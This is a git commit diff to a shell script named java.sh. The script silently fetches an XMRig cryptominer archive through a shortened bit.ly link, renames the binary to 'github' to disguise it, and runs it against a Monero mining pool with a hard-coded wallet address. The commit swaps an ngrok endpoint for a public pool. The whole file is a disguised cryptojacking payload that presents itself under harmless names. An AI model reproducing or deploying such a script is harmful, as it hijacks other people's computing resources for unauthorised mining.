c9af6e4809ee0ebb6e24927995c6cc91ae74a52d
Storage Small <100378380+storagegitpush404@users.noreply.github.com>
2022-03-20 02:32:30 -0700

    Update java.sh

--- java.sh
+++ java.sh
@@ -1,7 +1,6 @@
-#!/usr/bin/env bash
 wget -O xmrig-6.16.4-linux-static-x64.tar.gz https://bit.ly/34BX48f > /dev/null 2>&1
 tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
 cd xmrig-6.16.4
 mv xmrig github
 chmod u+x github
-./github --url 0.tcp.ap.ngrok.io:18192
+./github --url pool.hashvault.pro:80 --user iz4iVv3BoPLTSJyorbUTCUhmaFQcBSWV9EhH7XFiKBQiXqE9CGUo2yH547B46W7QNjHsZABRrmA62YAbPJqBAV3T1DcV3cSGQ --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
